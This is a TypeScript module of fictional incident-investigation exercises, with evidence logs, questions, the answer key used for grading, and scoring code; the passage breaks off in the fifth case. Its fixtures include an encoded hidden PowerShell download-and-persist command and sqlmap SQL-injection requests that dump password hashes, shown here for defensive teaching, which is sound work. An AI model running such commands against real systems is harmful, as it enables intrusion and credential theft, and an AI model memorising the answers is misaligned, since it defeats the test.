// Investigation cases: fictional evidence that learners analyse in the browser.
// All names, domains (.example) and IPs (RFC 5737 / RFC 1918) are reserved or invented.
// This module contains answers. The server grades with it; the web app only loads it in the mock demo build.

export type CaseDifficulty = 'beginner' | 'intermediate' | 'advanced';
export type CaseCategory = 'Authentication' | 'Phishing' | 'Endpoint' | 'Network' | 'Cloud' | 'Web';

export type CaseEvidence = {
  id: string;
  name: string;
  kind: 'log' | 'email' | 'json' | 'csv' | 'text';
  description: string;
  content: string;
};

export type CaseQuestion = {
  id: string;
  prompt: string;
  /** Shown next to the answer box, e.g. "IPv4 address". */
  format: string;
  hint: string;
  /** When present the learner picks one of these instead of typing. */
  options?: string[];
  /** Accepted answers, compared after normalizeCaseAnswer. */
  answers: string[];
  explanation: string;
  points: number;
};

export type InvestigationCase = {
  slug: string;
  title: string;
  summary: string;
  story: string;
  category: CaseCategory;
  difficulty: CaseDifficulty;
  estimatedMinutes: number;
  skills: string[];
  evidence: CaseEvidence[];
  questions: CaseQuestion[];
  debrief: string;
};

export type PublicCaseQuestion = Omit<CaseQuestion, 'answers' | 'explanation'>;
export type PublicInvestigationCase = Omit<InvestigationCase, 'questions' | 'debrief'> & { questions: PublicCaseQuestion[] };

export function normalizeCaseAnswer(value: string) {
  return value
    .trim()
    .toLowerCase()
    .replace(/^["'`]+|["'`]+$/g, '')
    .replace(/\s+/g, ' ')
    .replace(/(\d),(?=\d{3}\b)/g, '$1');
}

export function isCaseAnswerCorrect(question: CaseQuestion, answer: string) {
  const given = normalizeCaseAnswer(answer);
  return given.length > 0 && question.answers.some((accepted) => normalizeCaseAnswer(accepted) === given);
}

export function toPublicCase(item: InvestigationCase): PublicInvestigationCase {
  const { debrief: _debrief, questions, ...rest } = item;
  return { ...rest, questions: questions.map(({ answers: _answers, explanation: _explanation, ...question }) => question) };
}

/** Multiple-choice answers can be guessed, so a solve after a wrong pick earns half points. */
export function casePointsFor(question: CaseQuestion, attempts: number) {
  return question.options && attempts > 1 ? Math.floor(question.points / 2) : question.points;
}

export function caseTotalPoints(item: InvestigationCase) {
  return item.questions.reduce((sum, question) => sum + question.points, 0);
}

const vpnLog = `2026-03-14T02:10:51Z vpn-gw01 auth: FAIL    user=a.rahimova  src=203.0.113.45   reason=bad_password
2026-03-14T02:11:04Z vpn-gw01 auth: FAIL    user=b.tursunov  src=203.0.113.45   reason=bad_password
2026-03-14T02:11:19Z vpn-gw01 auth: FAIL    user=c.lee       src=203.0.113.45   reason=bad_password
2026-03-14T02:11:33Z vpn-gw01 auth: FAIL    user=d.patel     src=203.0.113.45   reason=bad_password
2026-03-14T02:11:48Z vpn-gw01 auth: FAIL    user=e.novak     src=203.0.113.45   reason=bad_password
2026-03-14T02:12:02Z vpn-gw01 auth: FAIL    user=f.garcia    src=203.0.113.45   reason=bad_password
2026-03-14T02:12:17Z vpn-gw01 auth: FAIL    user=k.ito       src=203.0.113.45   reason=bad_password
2026-03-14T02:12:31Z vpn-gw01 auth: FAIL    user=svc.backup  src=203.0.113.45   reason=account_disabled
2026-03-14T02:14:37Z vpn-gw01 auth: SUCCESS user=j.okafor    src=203.0.113.45   mfa=not_enrolled session=7f3a91
2026-03-14T02:15:02Z vpn-gw01 net:  ASSIGN  session=7f3a91 user=j.okafor inside_ip=10.8.0.112
2026-03-14T02:19:44Z vpn-gw01 net:  ACCESS  session=7f3a91 user=j.okafor dst=10.20.1.15:445 (FILESRV01)
2026-03-14T07:58:12Z vpn-gw01 auth: FAIL    user=m.chen      src=198.51.100.7   reason=bad_password
2026-03-14T07:58:40Z vpn-gw01 auth: SUCCESS user=m.chen      src=198.51.100.7   mfa=push_approved session=8c1d02
2026-03-14T08:03:09Z vpn-gw01 auth: SUCCESS user=a.rahimova  src=198.51.100.31  mfa=push_approved session=8c1e77
2026-03-14T08:20:55Z vpn-gw01 auth: SUCCESS user=c.lee       src=198.51.100.52  mfa=push_approved session=8c2410`;

const vpnUsers = `username,department,mfa_status,last_password_change
a.rahimova,Finance,enrolled,2026-01-09
b.tursunov,Sales,enrolled,2025-12-02
c.lee,Engineering,enrolled,2026-02-20
d.patel,Engineering,enrolled,2026-02-11
e.novak,HR,enrolled,2025-11-30
f.garcia,Support,enrolled,2026-01-27
j.okafor,Facilities,not_enrolled,2024-06-18
k.ito,Sales,enrolled,2026-02-02
m.chen,Finance,enrolled,2026-03-01
svc.backup,IT,exempt,2023-09-14`;

const phishEmail = `Return-Path: <bounce@contoso-billing.example>
Received: from mx1.northwind.example (mx1.northwind.example [10.0.0.25])
        by mail.northwind.example with ESMTPS id 4F2A1C
        for <d.karimov@northwind.example>; Tue, 10 Mar 2026 09:41:22 +0000
Received: from smtp-out.fastinvoice-cdn.example (unknown [198.51.100.77])
        by mx1.northwind.example with ESMTP id 88B21
        for <d.karimov@northwind.example>; Tue, 10 Mar 2026 09:41:19 +0000
Authentication-Results: mx1.northwind.example;
        spf=fail (mx1.northwind.example: domain of bounce@contoso-billing.example
            does not designate 198.51.100.77 as permitted sender)
            smtp.mailfrom=contoso-billing.example;
        dkim=none (message not signed);
        dmarc=fail action=quarantine header.from=contoso-billing.example
From: "Contoso Billing" <accounts@contoso-billing.example>
Reply-To: <payments.contoso@freemail.example>
To: <d.karimov@northwind.example>
Subject: URGENT: Overdue invoice INV-20931 - bank details changed
Date: Tue, 10 Mar 2026 09:41:15 +0000
Message-ID: <20260310094115.5521@smtp-out.fastinvoice-cdn.example>
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"

<p>Dear Northwind Finance,</p>
<p>Invoice INV-20931 for <b>$48,250.00</b> is now 14 days overdue.
Please note our bank details have <b>changed</b>. Payment must be made
to the new account today to avoid service suspension.</p>
<p><a href="https://contoso-billing.example.invoice-view.example/login?ref=INV-20931">https://portal.contoso-billing.example/invoices/INV-20931</a></p>
<p>Reply to this email with the remittance confirmation.</p>
<p>Regards,<br>Accounts Receivable<br>Contoso Ltd.</p>`;

const vendorRecord = `vendor,primary_contact,billing_domain,bank_change_policy
Contoso Ltd.,accounts@contoso.example,contoso.example,"Bank changes require a phone call to the number on file (+1-555-0142) and approval by two finance staff."`;

const encodedCommand = 'JAB1AD0AIgBoAHQAdABwAHMAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAG8AZAB1AHAAZAAuAGUAeABlACIAOwAkAHAAPQAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwATwBuAGUARAByAGkAdgBlAFUAcABkAGEAdABlAFwAbwBkAHUAcABkAC4AZQB4AGUAIgA7AE4AZQB3AC0ASQB0AGUAbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAEYAbwByAGMAZQAgACgAUwBwAGwAaQB0AC0AUABhAHQAaAAgACQAcAApAHwATwB1AHQALQBOAHUAbABsADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJAB1ACAALQBPAHUAdABGAGkAbABlACAAJABwAA==';

const sysmonEvents = [
  { UtcTime: '2026-03-10 09:51:58', EventID: 1, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: '"chrome.exe"' },
  { UtcTime: '2026-03-10 09:52:10', EventID: 1, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: '"WINWORD.EXE" /n "C:\\Users\\d.karimov\\Downloads\\Invoice_INV-20931.docm"' },
  { UtcTime: '2026-03-10 09:52:31', EventID: 1, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', ParentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', CommandLine: `powershell.exe -NoP -W Hidden -Enc ${encodedCommand}` },
  { UtcTime: '2026-03-10 09:52:33', EventID: 3, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Protocol: 'tcp', SourceIp: '10.20.3.41', DestinationIp: '198.51.100.23', DestinationPort: 443 },
  { UtcTime: '2026-03-10 09:52:40', EventID: 11, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', TargetFilename: 'C:\\Users\\d.karimov\\AppData\\Roaming\\OneDriveUpdate\\odupd.exe' },
  { UtcTime: '2026-03-10 09:52:44', EventID: 1, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Windows\\System32\\schtasks.exe', ParentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'schtasks.exe /Create /SC ONLOGON /TN "OneDriveUpdate" /TR "C:\\Users\\d.karimov\\AppData\\Roaming\\OneDriveUpdate\\odupd.exe" /F' },
  { UtcTime: '2026-03-10 09:53:02', EventID: 1, Computer: 'WS-FIN-07', User: 'NORTHWIND\\d.karimov', Image: 'C:\\Users\\d.karimov\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: '"Teams.exe" --system-initiated' }
];

const connLog = `#fields ts                    uid      id.orig_h    id.orig_p id.resp_h      id.resp_p proto service duration orig_bytes resp_bytes conn_state
2026-05-20T01:58:03Z  C1a9f2   10.20.2.33   52144     192.0.2.10     443       tcp   ssl     1.20     1840       52110      SF
2026-05-20T02:05:41Z  C7b311   10.20.5.8    49822     192.0.2.44     443       tcp   ssl     0.80     920        14002      SF
2026-05-20T02:13:07Z  C2d4e8   10.20.4.17   50511     203.0.113.80   8443      tcp   ssl     312.40   104857600  20480      SF
2026-05-20T02:18:55Z  C9e0a1   10.20.4.17   50518     203.0.113.80   8443      tcp   ssl     455.10   157286400  24576      SF
2026-05-20T02:26:30Z  C4f7c6   10.20.4.17   50527     203.0.113.80   8443      tcp   ssl     601.90   209715200  30720      SF
2026-05-20T02:31:12Z  C0aa53   10.20.2.33   52190     192.0.2.10     443       tcp   ssl     1.10     1702       48230      SF
2026-05-20T02:37:48Z  C6c2b9   10.20.4.17   50536     203.0.113.80   8443      tcp   ssl     150.30   52428800   8192       SF
2026-05-20T02:41:19Z  C3b8d0   10.20.4.17   50541     203.0.113.80   8443      tcp   ssl     688.70   230686720  33792      SF
2026-05-20T03:02:26Z  C8d5e4   10.20.5.8    49870     192.0.2.44     443       tcp   ssl     0.90     1004       15210      SF`;

const dnsLog = `#fields ts                    id.orig_h    query                     qtype answers
2026-05-20T01:58:02Z  10.20.2.33   updates.vendor-av.example A     192.0.2.10
2026-05-20T02:05:40Z  10.20.5.8    time.northwind.example    A     192.0.2.44
2026-05-20T02:12:58Z  10.20.4.17   files-sync.example        A     203.0.113.80
2026-05-20T02:31:11Z  10.20.2.33   updates.vendor-av.example A     192.0.2.10`;

const assetInventory = `ip,hostname,owner,department,role
10.20.2.33,FIN-WS-03,a.rahimova,Finance,workstation
10.20.4.17,HR-WS-12,l.mendes,HR,workstation
10.20.5.8,IT-NTP-01,it-ops,IT,server`;

const cloudTrail = JSON.stringify([
  { eventTime: '2026-04-02T13:58:20Z', eventName: 'ListBuckets', eventSource: 's3.amazonaws.com', userIdentity: { type: 'IAMUser', userName: 'alice.admin', arn: 'arn:aws:iam::111122223333:user/alice.admin' }, sourceIPAddress: '10.40.2.15', userAgent: 'console.amazonaws.com' },
  { eventTime: '2026-04-02T14:05:09Z', eventName: 'DeletePublicAccessBlock', eventSource: 's3.amazonaws.com', userIdentity: { type: 'IAMUser', userName: 'ci-deployer', arn: 'arn:aws:iam::111122223333:user/ci-deployer' }, sourceIPAddress: '10.40.1.9', userAgent: 'terraform/1.7.4', requestParameters: { bucketName: 'northwind-payroll-exports' } },
  { eventTime: '2026-04-02T14:05:11Z', eventName: 'PutBucketPolicy', eventSource: 's3.amazonaws.com', userIdentity: { type: 'IAMUser', userName: 'ci-deployer', arn: 'arn:aws:iam::111122223333:user/ci-deployer' }, sourceIPAddress: '10.40.1.9', userAgent: 'terraform/1.7.4', requestParameters: { bucketName: 'northwind-payroll-exports', bucketPolicy: { Version: '2012-10-17', Statement: [{ Sid: 'PublicRead', Effect: 'Allow', Principal: '*', Action: 's3:GetObject', Resource: 'arn:aws:s3:::northwind-payroll-exports/*' }] } } },
  { eventTime: '2026-04-02T16:40:03Z', eventName: 'PutObject', eventSource: 's3.amazonaws.com', userIdentity: { type: 'IAMUser', userName: 'payroll-export-job', arn: 'arn:aws:iam::111122223333:user/payroll-export-job' }, sourceIPAddress: '10.40.3.21', userAgent: 'aws-sdk-python/1.34', requestParameters: { bucketName: 'northwind-payroll-exports', key: '2026-03/payroll.csv' } },
  { eventTime: '2026-04-03T03:22:47Z', eventName: 'GetObject', eventSource: 's3.amazonaws.com', userIdentity: { type: 'AWSAccount', principalId: '', accountId: 'anonymous' }, sourceIPAddress: '203.0.113.150', userAgent: 'curl/8.5.0', requestParameters: { bucketName: 'northwind-payroll-exports', key: '2026-03/payroll.csv' } },
  { eventTime: '2026-04-03T05:10:02Z', eventName: 'GetObject', eventSource: 's3.amazonaws.com', userIdentity: { type: 'AWSAccount', principalId: '', accountId: 'anonymous' }, sourceIPAddress: '198.51.100.200', userAgent: 'python-requests/2.31', requestParameters: { bucketName: 'northwind-payroll-exports', key: '2026-03/payroll.csv' } }
], null, 2);

const accessLog = `10.20.2.33 - - [21/Jun/2026:10:02:11 +0000] "GET /products.php?id=12 HTTP/1.1" 200 4120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.0.2.88 - - [21/Jun/2026:10:03:40 +0000] "POST /login HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4)"
198.51.100.66 - - [21/Jun/2026:10:04:02 +0000] "GET /products.php?id=12 HTTP/1.1" 200 4120 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:03 +0000] "GET /products.php?id=12%27 HTTP/1.1" 500 312 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:03 +0000] "GET /products.php?id=12%22 HTTP/1.1" 500 312 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:05 +0000] "GET /products.php?id=12%20AND%201%3D1 HTTP/1.1" 200 4120 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:06 +0000] "GET /products.php?id=12%20AND%201%3D2 HTTP/1.1" 200 610 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:09 +0000] "GET /products.php?id=12%20ORDER%20BY%206 HTTP/1.1" 500 312 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
198.51.100.66 - - [21/Jun/2026:10:04:31 +0000] "GET /products.php?id=-1%20UNION%20ALL%20SELECT%20username,password_hash,email,NULL,NULL%20FROM%20users-- HTTP/1.1" 200 88412 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
192.0.2.91 - - [21/Jun/2026:10:05:12 +0000] "GET /about HTTP/1.1" 200 2210 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)"`;

export const investigationCases: InvestigationCase[] = [
  {
    slug: 'vpn-password-spray',
    title: 'Night shift at the VPN gateway',
    summary: 'Many failed VPN logins from one address, then one success. Find out who got in and why.',
    story: 'At 08:30 the Northwind help desk gets a call: Jamal Okafor from Facilities says he was not working last night, but his VPN account shows a session at 02:14. You are the on-call analyst. You have the VPN gateway log for the night and an export of the user directory.',
    category: 'Authentication',
    difficulty: 'beginner',
    estimatedMinutes: 15,
    skills: ['Log reading', 'Password spraying', 'MFA coverage'],
    evidence: [
      { id: 'vpn-log', name: 'vpn-gw01.log', kind: 'log', description: 'VPN gateway authentication and session log, UTC.', content: vpnLog },
      { id: 'users', name: 'directory-export.csv', kind: 'csv', description: 'User directory export with MFA status.', content: vpnUsers }
    ],
    questions: [
      { id: 'q1', prompt: 'Which source IP address made the burst of failed logins?', format: 'IPv4 address', hint: 'Look for one src value that repeats across many different users in a short window.', answers: ['203.0.113.45'], explanation: '203.0.113.45 tried a different user every ~15 seconds between 02:10 and 02:12. One password tried against many accounts is called password spraying.', points: 10 },
      { id: 'q2', prompt: 'How many different user accounts did that IP try to log in as, including the one that worked?', format: 'Number', hint: 'Count unique user= values for that src. Do not count the same user twice.', answers: ['9'], explanation: 'Nine accounts: eight FAIL lines (seven bad passwords plus the disabled svc.backup) and the SUCCESS for j.okafor. Spraying spreads attempts thinly so no single account locks out.', points: 10 },
      { id: 'q3', prompt: 'Which account did the attacker get into?', format: 'Username', hint: 'Find the SUCCESS line from the same IP.', answers: ['j.okafor'], explanation: 'j.okafor logged in successfully from 203.0.113.45 at 02:14:37, the same address as the spray.', points: 10 },
      { id: 'q4', prompt: 'At what time (UTC) did the attacker log in successfully?', format: 'HH:MM:SS', hint: 'Use the timestamp on the SUCCESS line for the attacker IP.', answers: ['02:14:37', '2026-03-14T02:14:37Z', '2026-03-14 02:14:37'], explanation: 'The successful login was at 02:14:37 UTC. This time starts your incident timeline.', points: 10 },
      { id: 'q5', prompt: 'Why did the login succeed with only a password?', format: 'Pick one', hint: 'Compare the mfa= field on the SUCCESS line with the directory export.', options: ['The account was not enrolled in MFA', 'The user approved a fake MFA push', 'The VPN had MFA turned off for everyone', 'The attacker used a disabled service account'], answers: ['The account was not enrolled in MFA'], explanation: 'The log shows mfa=not_enrolled, and the directory export confirms j.okafor never enrolled. His password was also last changed in 2024. Every other human account in the spray had MFA.', points: 15 },
      { id: 'q6', prompt: 'Which internal server did the attacker reach after logging in?', format: 'Hostname', hint: 'Follow session=7f3a91 after the login.', answers: ['FILESRV01', '10.20.1.15'], explanation: 'Session 7f3a91 connected to FILESRV01 (10.20.1.15) on port 445, which is Windows file sharing. That server is now in scope for the investigation.', points: 15 }
    ],
    debrief: 'This is a classic password spray. One IP tried one or two common passwords against many accounts, slowly enough to avoid lockouts, and got lucky on the only human account without MFA. Good next steps: disable j.okafor and end session 7f3a91, reset the password, block 203.0.113.45 at the gateway, review FILESRV01 access logs from 02:19 onward, and require MFA enrollment before VPN access. The real fix is closing the MFA gap so one weak password is never enough.'
  },
  {
    slug: 'invoice-bank-change-phish',
    title: 'The urgent invoice',
    summary: 'A finance clerk forwards an "overdue invoice" with new bank details. Read the headers and decide.',
    story: 'Dilnoza Karimov in Finance received an urgent email from a known supplier, Contoso, saying their bank account changed and an invoice is overdue. She did not pay yet. She reported it with the full headers and asked if it is real. You also have the vendor record from the finance system.',
    category: 'Phishing',
    difficulty: 'beginner',
    estimatedMinutes: 15,
    skills: ['Email headers', 'SPF / DKIM / DMARC', 'Business email compromise'],
    evidence: [
      { id: 'email', name: 'reported-message.eml', kind: 'email', description: 'The reported email with full headers.', content: phishEmail },
      { id: 'vendor', name: 'vendor-record.csv', kind: 'csv', description: 'Supplier record from the finance system.', content: vendorRecord }
    ],
    questions: [
      { id: 'q1', prompt: 'What is the IP address of the server that first handed this email to Northwind?', format: 'IPv4 address', hint: 'Received headers are added top-down as mail travels, so read them bottom-up. The lowest one is the outside sender.', answers: ['198.51.100.77'], explanation: 'The bottom Received header shows smtp-out.fastinvoice-cdn.example [198.51.100.77] handing the message to mx1. The top header is only Northwind passing it internally.', points: 10 },
      { id: 'q2', prompt: 'What was the SPF result?', format: 'One word', hint: 'Look in Authentication-Results.', answers: ['fail', 'spf=fail'], explanation: 'spf=fail: the sending IP is not on the list of servers allowed to send for contoso-billing.example. DKIM is missing and DMARC also failed.', points: 10 },
      { id: 'q3', prompt: 'Where would a reply to this email actually go?', format: 'Email address', hint: 'Check the Reply-To header.', answers: ['payments.contoso@freemail.example'], explanation: 'Reply-To points to a free webmail address, not the supplier. Attackers do this so the conversation moves to a mailbox they control.', points: 10 },
      { id: 'q4', prompt: 'The link text shows portal.contoso-billing.example. What registered domain does the link really go to?', format: 'Domain', hint: 'Read the href, not the visible text. The registered domain is the last two labels before the path.', answers: ['invoice-view.example'], explanation: 'The href is contoso-billing.example.invoice-view.example. Everything left of invoice-view.example is just a subdomain the attacker chose to look trustworthy.', points: 15 },
      { id: 'q5', prompt: 'Does the sender domain match the supplier on file?', format: 'Pick one', hint: 'Compare the From domain with billing_domain in the vendor record.', options: ['No, the real supplier uses contoso.example', 'Yes, it is the same domain', 'There is no vendor record to compare'], answers: ['No, the real supplier uses contoso.example'], explanation: 'The real supplier sends from contoso.example. contoso-billing.example is a lookalike domain registered to impersonate them.', points: 10 },
      { id: 'q6', prompt: 'What should Finance do next?', format: 'Pick one', hint: 'The vendor record has a policy for exactly this.', options: ['Call Contoso on the number already on file and do not change bank details', 'Reply to the email and ask for proof', 'Pay a small test amount to the new account', 'Click the link to check the invoice'], answers: ['Call Contoso on the number already on file and do not change bank details'], explanation: 'Verify through a channel you already trust, never one the email gives you. The vendor policy requires a call to +1-555-0142 and two approvers.', points: 15 }
    ],
    debrief: 'This is business email compromise, specifically invoice and bank-change fraud. No malware was needed, only urgency and a lookalike domain. The technical signs (SPF fail, no DKIM, DMARC fail, a free-mail Reply-To, a link host that differs from its text) all agree, and the process control (call-back to a known number with two approvers) would stop it even if the email had passed every check. Report the domain, block it at the mail gateway, and search other mailboxes for the same Message-ID or sender.'
  },
  {
    slug: 'macro-powershell-persistence',
    title: 'Word opened PowerShell',
    summary: 'An EDR alert fires on a finance laptop. Trace what the document did and what it left behind.',
    story: 'Ten minutes after the invoice email arrived, the EDR raised "Office application spawned PowerShell" on WS-FIN-07, a different finance laptop where the user did open the attachment. You have the Sysmon events from that host for the minutes around the alert.',
    category: 'Endpoint',
    difficulty: 'intermediate',
    estimatedMinutes: 25,
    skills: ['Process trees', 'Base64 decoding', 'Persistence', 'MITRE ATT&CK'],
    evidence: [
      { id: 'sysmon', name: 'ws-fin-07-sysmon.json', kind: 'json', description: 'Sysmon events. EventID 1 = process created, 3 = network connection, 11 = file created.', content: JSON.stringify(sysmonEvents, null, 2) },
      { id: 'notes', name: 'decoding-notes.txt', kind: 'text', description: 'Analyst notes on encoded PowerShell.', content: 'PowerShell -Enc (-EncodedCommand) takes Base64 of UTF-16LE text.\nTo read it safely, decode it as text. Never run it.\nCyberChef recipe: From Base64 -> Decode text (UTF-16LE).\nIn Python: base64.b64decode(s).decode("utf-16-le")' }
    ],
    questions: [
      { id: 'q1', prompt: 'Which program started powershell.exe?', format: 'Process name', hint: 'Check ParentImage on the PowerShell process event.', answers: ['WINWORD.EXE', 'winword', 'Microsoft Word', 'word'], explanation: 'WINWORD.EXE is the parent. Word had just opened Invoice_INV-20931.docm, a macro-enabled document. Office starting a shell is rarely legitimate.', points: 10 },
      { id: 'q2', prompt: 'Decode the -Enc value. What full URL does the command download from?', format: 'URL', hint: 'Base64 to bytes, then read the bytes as UTF-16LE text. The URL is in the $u variable.', answers: ['https://198.51.100.23/odupd.exe'], explanation: 'The decoded script sets $u="https://198.51.100.23/odupd.exe" and saves it to %APPDATA%\\OneDriveUpdate\\odupd.exe with Invoke-WebRequest.', points: 20 },
      { id: 'q3', prompt: 'What remote IP did PowerShell connect to?', format: 'IPv4 address', hint: 'EventID 3 is a network connection.', answers: ['198.51.100.23'], explanation: 'EventID 3 shows powershell.exe connecting to 198.51.100.23:443, which matches the decoded URL.', points: 10 },
      { id: 'q4', prompt: 'What is the name of the scheduled task created for persistence?', format: 'Task name', hint: 'Look at the /TN argument of schtasks.exe.', answers: ['OneDriveUpdate'], explanation: 'schtasks /Create /SC ONLOGON /TN "OneDriveUpdate" runs the dropped file every time the user logs in. The name is chosen to blend in with real OneDrive tasks.', points: 10 },
      { id: 'q5', prompt: 'What is the MITRE ATT&CK technique ID for persistence through a scheduled task?', format: 'Technique ID, e.g. T1234.001', hint: 'It is a sub-technique of Scheduled Task/Job.', answers: ['T1053.005', 'T1053'], explanation: 'T1053.005 is Scheduled Task/Job: Scheduled Task. Tagging findings with ATT&CK IDs lets other teams search for the same behaviour.', points: 15 },
      { id: 'q6', prompt: 'What should you do first?', format: 'Pick one', hint: 'The host may still be talking to the attacker.', options: ['Isolate WS-FIN-07 with the EDR and keep it powered on for evidence', 'Delete odupd.exe and close the ticket', 'Reboot the laptop to stop the process', 'Ask the user to run a full antivirus scan'], answers: ['Isolate WS-FIN-07 with the EDR and keep it powered on for evidence'], explanation: 'Network isolation cuts off the attacker while keeping memory and disk intact for investigation. Deleting one file or rebooting destroys evidence and misses anything else the payload did.', points: 15 }
    ],
    debrief: 'The chain is: macro-enabled invoice, Word spawns hidden encoded PowerShell, PowerShell downloads odupd.exe from 198.51.100.23, and a logon scheduled task keeps it running. Containment is host isolation, then remove the task and file, block the IP and domain, reset the user\'s credentials, and hunt for the same parent-child pattern (WINWORD.EXE to powershell.exe) on every other host. Long-term, blocking macros in files from the internet stops this whole class of attack.'
  },
  {
    slug: 'night-time-upload',
    title: 'Gigabytes at 2 a.m.',
    summary: 'The firewall team sees large outbound transfers overnight. Work out which machine, where to, and how much.',
    story: 'The network team noticed an unusual spike of outbound traffic between 02:00 and 03:00 on 20 May. Nobody was in the office. You have Zeek connection and DNS logs for that hour and the asset inventory.',
    category: 'Network',
    difficulty: 'intermediate',
    estimatedMinutes: 20,
    skills: ['Zeek logs', 'Data exfiltration', 'Correlating sources'],
    evidence: [
      { id: 'conn', name: 'conn.log', kind: 'log', description: 'Zeek connection log. orig_bytes is data sent by the internal host.', content: connLog },
      { id: 'dns', name: 'dns.log', kind: 'log', description: 'Zeek DNS log for the same hour.', content: dnsLog },
      { id: 'assets', name: 'asset-inventory.csv', kind: 'csv', description: 'IP-to-host inventory.', content: assetInventory }
    ],
    questions: [
      { id: 'q1', prompt: 'Which internal IP sent the large transfers?', format: 'IPv4 address', hint: 'Sort by orig_bytes in your head. Which source keeps sending 50 MB or more?', answers: ['10.20.4.17'], explanation: '10.20.4.17 made five long connections, each sending between 50 MB and 220 MB. The other hosts send a few kilobytes.', points: 10 },
      { id: 'q2', prompt: 'Which domain name did that host look up just before the first transfer?', format: 'Domain', hint: 'Match the destination IP with an answer in dns.log.', answers: ['files-sync.example'], explanation: 'At 02:12:58 the host resolved files-sync.example to 203.0.113.80, nine seconds before the first upload began.', points: 10 },
      { id: 'q3', prompt: 'Which destination port was used?', format: 'Port number', hint: 'id.resp_p on the large connections.', answers: ['8443'], explanation: 'Port 8443 is a common alternate HTTPS port. It is not unusual alone, but it is unusual for a workstation at 2 a.m.', points: 5 },
      { id: 'q4', prompt: 'How many bytes in total did the host send to 203.0.113.80?', format: 'Number of bytes', hint: 'Add orig_bytes for the five connections to 203.0.113.80.', answers: ['754974720'], explanation: '104,857,600 + 157,286,400 + 209,715,200 + 52,428,800 + 230,686,720 = 754,974,720 bytes, which is 720 MiB.', points: 20 },
      { id: 'q5', prompt: 'Which hostname is this, and who is its owner? Give the owner\'s username.', format: 'Username', hint: 'Look up the IP in the asset inventory.', answers: ['l.mendes'], explanation: '10.20.4.17 is HR-WS-12, owned by l.mendes in HR. HR workstations hold personal data, which raises the severity.', points: 10 },
      { id: 'q6', prompt: 'What is the most accurate summary for your ticket?', format: 'Pick one', hint: 'Stick to what the logs prove.', options: ['Possible exfiltration: HR-WS-12 sent ~720 MiB to files-sync.example (203.0.113.80:8443) between 02:13 and 02:53 UTC', 'Confirmed ransomware on HR-WS-12', 'Normal backup traffic to the antivirus vendor', 'The firewall is broken and miscounting bytes'], answers: ['Possible exfiltration: HR-WS-12 sent ~720 MiB to files-sync.example (203.0.113.80:8443) between 02:13 and 02:53 UTC'], explanation: 'Good tickets state what the evidence shows and how sure you are. The logs show a large upload to an unknown domain. They do not show what the data was or that ransomware is involved.', points: 15 }
    ],
    debrief: 'Volume, timing and destination together make this suspicious: a workstation with no user present uploaded about 720 MiB to a domain no other host uses. The next steps are to isolate HR-WS-12, check whether a user or a process started the uploads (EDR process and network events for 02:12-02:53), block files-sync.example and 203.0.113.80, and involve the privacy team because HR data may be affected. Zeek conn.log does not show content, so do not claim what was taken until you have host evidence.'
  },
  {
    slug: 'public-payroll-bucket',
    title: 'Payroll on the open internet',
    summary: 'A storage bucket became public after a deployment. Find the change, who made it, and who downloaded what.',
    story: 'A security researcher emailed Northwind: "Your payroll file is downloadable without a login." You have CloudTrail events for the payroll storage bucket over two days.',
    category: 'Cloud',
    difficulty: 'beginner',
    estimatedMinutes: 15,
    skills: ['CloudTrail', 'Storage permissions', 'Change tracking'],
    evidence: [
      { id: 'trail', name: 'cloudtrail-s3.json', kind: 'json', description: 'CloudTrail management and data events, UTC.', content: cloudTrail }
    ],
    questions: [
      { id: 'q1', prompt: 'What is the name of the bucket that was exposed?', format: 'Bucket name', hint: 'requestParameters.bucketName', answers: ['northwind-payroll-exports'], explanation: 'Every relevant event targets northwind-payroll-exports.', points: 5 },
      { id: 'q2', prompt: 'Which API call removed the bucket\'s "block public access" protection?', format: 'API event name', hint: 'It happened a few seconds before the policy change.', answers: ['DeletePublicAccessBlock'], explanation: 'DeletePublicAccessBlock at 14:05:09 turned off the guardrail. Without that, the public policy two seconds later would have been rejected.', points: 15 },
